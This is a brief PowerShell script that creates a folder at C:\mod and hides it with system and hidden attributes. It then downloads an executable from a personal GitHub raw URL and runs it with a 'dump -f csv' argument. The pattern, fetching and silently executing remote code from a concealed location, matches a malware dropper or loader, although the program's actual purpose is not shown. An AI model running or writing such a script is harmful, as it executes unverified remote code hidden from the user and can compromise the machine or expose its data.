$folder = "C:\mod"
$exe = "$folder\program.exe"
$url = "https://raw.githubusercontent.com/zesty7272/mods2/refs/heads/main/program.exe"


New-Item -ItemType Directory -Path $folder -Force | Out-Null
attrib +h +s $folder


Invoke-WebRequest -Uri $url -OutFile $exe


Start-Process -FilePath $exe -ArgumentList "dump -f csv" -WorkingDirectory $folder -Wait
